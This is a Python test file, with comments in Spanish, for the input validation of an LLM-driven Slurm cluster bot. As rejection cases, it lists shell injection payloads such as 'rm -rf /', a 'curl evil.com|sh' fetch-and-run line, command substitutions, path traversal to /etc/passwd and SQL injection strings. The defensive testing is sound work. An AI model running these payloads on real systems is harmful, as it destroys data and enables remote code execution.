"""Tests de los modelos de dominio: validación y sanitización.

Esta es la frontera de seguridad del sistema: si estos tests pasan,
ningún parámetro malicioso del LLM llega a construir un comando.
"""
import pytest
from pydantic import ValidationError

from becario.domain.models import (
    ClusterIdentity,
    HistoryFilter,
    Intent,
    JobId,
    ListFilesRequest,
    PendingAction,
    PendingPlan,
    Plan,
    PlanStep,
    RemoteDirRequest,
    SlurmJobRequest,
    is_plausible_formula,
)


class TestSlurmJobRequest:
    def test_valid_request(self):
        req = SlurmJobRequest(
            job_name="grafeno_dft",
            partition="gpu",
            nodes=2,
            time_limit="12:00:00",
            script_path="/home/user/calc.sh",
        )
        assert req.job_name == "grafeno_dft"
        assert req.nodes == 2

    def test_defaults(self):
        req = SlurmJobRequest(script_path="/opt/run.sh")
        assert req.job_name == "becario_job"
        assert req.partition == "default"
        assert req.nodes == 1
        assert req.time_limit == "01:00:00"

    def test_job_name_is_sanitized_not_rejected(self):
        # El nombre viene del LLM: caracteres raros se reemplazan por _
        req = SlurmJobRequest(job_name="mi job; rm -rf /", script_path="/a/b.sh")
        assert ";" not in req.job_name
        assert " " not in req.job_name
        assert "/" not in req.job_name

    @pytest.mark.parametrize(
        "evil",
        [
            "/tmp/x.sh; rm -rf /",
            "/tmp/x.sh && curl evil.com|sh",
            "/tmp/$(whoami).sh",
            "/tmp/`id`.sh",
            "relative/path.sh",
            "/tmp/../etc/passwd",
            "/tmp/x.sh\nscancel -u root",
            "/tmp/x'.sh",
        ],
    )
    def test_script_path_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            SlurmJobRequest(script_path=evil)

    @pytest.mark.parametrize("evil", ["gpu; ls", "gpu&&id", "gpu partition", "gpu\n"])
    def test_partition_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            SlurmJobRequest(partition=evil, script_path="/a/b.sh")

    @pytest.mark.parametrize(
        "bad_time", ["100", "1:2:3x", "24h", "; sleep 99", "01:00:00; ls"]
    )
    def test_time_limit_injection_rejected(self, bad_time):
        with pytest.raises(ValidationError):
            SlurmJobRequest(time_limit=bad_time, script_path="/a/b.sh")

    @pytest.mark.parametrize("good_time", ["01:00:00", "123:59:59", "2-12:00:00"])
    def test_time_limit_valid_formats(self, good_time):
        req = SlurmJobRequest(time_limit=good_time, script_path="/a/b.sh")
        assert req.time_limit == good_time

    def test_nodes_bounds(self):
        with pytest.raises(ValidationError):
            SlurmJobRequest(nodes=0, script_path="/a/b.sh")
        with pytest.raises(ValidationError):
            SlurmJobRequest(nodes=1000, script_path="/a/b.sh")


class TestJobId:
    @pytest.mark.parametrize("good", ["12345", "1", "123456_78"])
    def test_valid(self, good):
        assert JobId(value=good).value == good

    @pytest.mark.parametrize(
        "evil",
        ["12345; scancel -u root", "$(id)", "12345 67890", "", "abc", "12\n345"],
    )
    def test_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            JobId(value=evil)

    def test_surrounding_whitespace_is_normalized(self):
        # Los LLM suelen agregar whitespace: se limpia con strip y luego se
        # valida estricto. El resultado nunca contiene el newline.
        assert JobId(value="12345\n").value == "12345"
        assert JobId(value="  12345  ").value == "12345"


class TestRemoteDirRequest:
    @pytest.mark.parametrize("good", ["/home/ana/pruebas", "/scratch/runs/Zr_hcp"])
    def test_valid(self, good):
        assert RemoteDirRequest(path=good).path == good

    def test_surrounding_whitespace_is_normalized(self):
        assert RemoteDirRequest(path="  /home/ana/pruebas  ").path == "/home/ana/pruebas"

    @pytest.mark.parametrize(
        "evil",
        [
            "relativa/pruebas",
            "/tmp/../etc",
            "/tmp/x; rm -rf /",
            "/tmp/$(whoami)",
            "/tmp/`id`",
            "/tmp/x\nscancel -u root",
            "/tmp/x'",
            "",
        ],
    )
    def test_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            RemoteDirRequest(path=evil)


class TestListFilesRequest:
    """Comparte `_validate_remote_dir_path` con `RemoteDirRequest`: basta
    verificar que la política compartida rige también acá."""

    def test_valid_path_and_whitespace(self):
        assert ListFilesRequest(path="  /data/becario_runs ").path == "/data/becario_runs"

    @pytest.mark.parametrize("evil", ["relativa/x", "/tmp/../etc", "/tmp/$(id)"])
    def test_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            ListFilesRequest(path=evil)


class TestHistoryFilter:
    def test_sql_wildcards_are_data_not_code(self):
        # Con queries parametrizadas, esto es solo texto de búsqueda.
        flt = HistoryFilter(name_contains="'; DROP TABLE historial_calculos; --")
        assert flt.name_contains is not None

    def test_bad_job_id_rejected(self):
        with pytest.raises(ValidationError):
            HistoryFilter(job_id="1 OR 1=1")

    def test_limit_bounds(self):
        with pytest.raises(ValidationError):
            HistoryFilter(limit=0)
        with pytest.raises(ValidationError):
            HistoryFilter(limit=999)


class TestPendingAction:
    def test_tokens_are_unique(self):
        a1 = PendingAction(chat_id=1, requester_id=1, intent=Intent.CANCEL_JOB, description="", payload={})
        a2 = PendingAction(chat_id=1, requester_id=1, intent=Intent.CANCEL_JOB, description="", payload={})
        assert a1.token != a2.token

    def test_expiry(self):
        action = PendingAction(
            chat_id=1, requester_id=1, intent=Intent.CANCEL_JOB, description="", payload={}
        )
        assert not action.expired(ttl_seconds=60)
        action.created_at -= 120
        assert action.expired(ttl_seconds=60)


class TestClusterIdentity:
    def test_valid(self):
        idn = ClusterIdentity(
            telegram_user_id=111, ssh_user="jperez", ssh_key_path="/x/id_rsa"
        )
        assert idn.ssh_user == "jperez"
        assert idn.ssh_host is None  # usa el host global por defecto

    @pytest.mark.parametrize(
        "evil", ["root; rm -rf /", "Jperez", "j perez", "-jperez", "a" * 33]
    )
    def test_invalid_ssh_user_rejected(self, evil):
        with pytest.raises(ValidationError):
            ClusterIdentity(telegram_user_id=1, ssh_user=evil, ssh_key_path="/x")

    def test_optional_host_override(self):
        idn = ClusterIdentity(
            telegram_user_id=1, ssh_user="jperez", ssh_key_path="/x",
            ssh_host="otro-cluster.edu.ar",
        )
        assert idn.ssh_host == "otro-cluster.edu.ar"


class TestIntent:
    def test_destructive_set(self):
        assert Intent.SUBMIT_SLURM in Intent.destructive()
        assert Intent.CANCEL_JOB in Intent.destructive()
        assert Intent.CHECK_STATUS not in Intent.destructive()
        assert Intent.QUERY_DB not in Intent.destructive()


class TestPlan:
    """Suite de validación del Plan: forma fail-closed, tope de pasos y la
    regla "a lo sumo un paso destructivo y, si existe, va al final"."""

    def test_single_safe_step_is_accepted(self):
        plan = Plan(steps=[PlanStep(action=Intent.CHECK_STATUS)])
        assert len(plan.steps) == 1

    def test_single_destructive_step_is_accepted(self):
        plan = Plan(steps=[PlanStep(action=Intent.SUBMIT_SLURM)])
        assert len(plan.steps) == 1

    def test_safe_composition_is_accepted(self):
        plan = Plan(
            steps=[
                PlanStep(action=Intent.CREATE_DIR),
                PlanStep(action=Intent.LIST_FILES),
            ]
        )
        assert [s.action for s in plan.steps] == [Intent.CREATE_DIR, Intent.LIST_FILES]

    def test_destructive_step_allowed_as_last(self):
        plan = Plan(
            steps=[
                PlanStep(action=Intent.CREATE_DIR),
                PlanStep(action=Intent.SUBMIT_SLURM),
            ]
        )
        assert plan.steps[-1].action == Intent.SUBMIT_SLURM

    def test_destructive_step_not_last_rejected(self):
        with pytest.raises(ValidationError):
            Plan(
                steps=[
                    PlanStep(action=Intent.SUBMIT_SLURM),
                    PlanStep(action=Intent.CREATE_DIR),
                ]
            )

    def test_two_destructive_steps_rejected(self):
        with pytest.raises(ValidationError):
            Plan(
                steps=[
                    PlanStep(action=Intent.SUBMIT_SLURM),
                    PlanStep(action=Intent.CANCEL_JOB),
                ]
            )

    def test_too_many_steps_rejected(self):
        with pytest.raises(ValidationError):
            Plan(steps=[PlanStep(action=Intent.LIST_FILES) for _ in range(6)])

    def test_max_steps_is_accepted(self):
        plan = Plan(steps=[PlanStep(action=Intent.LIST_FILES) for _ in range(5)])
        assert len(plan.steps) == 5

    def test_empty_steps_rejected(self):
        with pytest.raises(ValidationError):
            Plan(steps=[])

    def test_step_parametros_default_empty_dict(self):
        step = PlanStep(action=Intent.LIST_FILES)
        assert step.parametros == {}


class TestPendingPlan:
    """`PendingPlan` es la unidad que guarda el ConfirmationStore: un token
    y un TTL por plan, con pasos ordenados en forma de `PendingAction`."""

    def _step(self, intent: Intent = Intent.CANCEL_JOB, request_intent=None) -> PendingAction:
        return PendingAction(
            chat_id=1,
            requester_id=1,
            intent=intent,
            description="",
            payload={},
            request_intent=request_intent,
        )

    def test_tokens_are_unique(self):
        p1 = PendingPlan(chat_id=1, requester_id=1, steps=[self._step()])
        p2 = PendingPlan(chat_id=1, requester_id=1, steps=[self._step()])
        assert p1.token != p2.token

    def test_expiry(self):
        plan = PendingPlan(chat_id=1, requester_id=1, steps=[self._step()])
        assert not plan.expired(ttl_seconds=60)
        plan.created_at -= 120
        assert plan.expired(ttl_seconds=60)

    def test_allow_modify_false_when_no_step_is_modifiable(self):
        plan = PendingPlan(chat_id=1, requester_id=1, steps=[self._step(request_intent=None)])
        assert plan.allow_modify is False

    def test_allow_modify_true_when_any_step_is_modifiable(self):
        plan = PendingPlan(
            chat_id=1,
            requester_id=1,
            steps=[
                self._step(intent=Intent.CANCEL_JOB, request_intent=None),
                self._step(intent=Intent.SUBMIT_SLURM, request_intent=Intent.SUBMIT_SLURM),
            ],
        )
        assert plan.allow_modify is True


class TestIsPlausibleFormula:
    """`is_plausible_formula` es la frontera anti-alucinación para
    'formula': acepta símbolos/fórmulas químicas reales y rechaza
    cualquier otra cosa que el LLM haya inventado (p. ej. una referencia
    mal resuelta como 'ultimo_calculo')."""

    @pytest.mark.parametrize(
        "formula", ["Zr", "W", "Si", "NaCl", "TiO2", "H2O", "Au"]
    )
    def test_plausible_formulas(self, formula):
        assert is_plausible_formula(formula) is True

    @pytest.mark.parametrize(
        "formula",
        [
            "ultimo_calculo",  # tiene '_': ni siquiera pasa el regex base
            "ultimocalculo",  # pasa el regex pero no tokeniza en elementos
            "",
            "último",
            "calc-1",
            "Xx7",  # 'Xx' no es un símbolo real
            "123",
            "A_B",
        ],
    )
    def test_implausible_formulas(self, formula):
        assert is_plausible_formula(formula) is False
